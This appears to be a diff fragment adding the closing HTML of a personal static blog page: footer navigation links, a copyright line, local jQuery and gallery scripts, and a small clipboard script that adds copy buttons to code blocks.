+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2020
+    ca5tle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
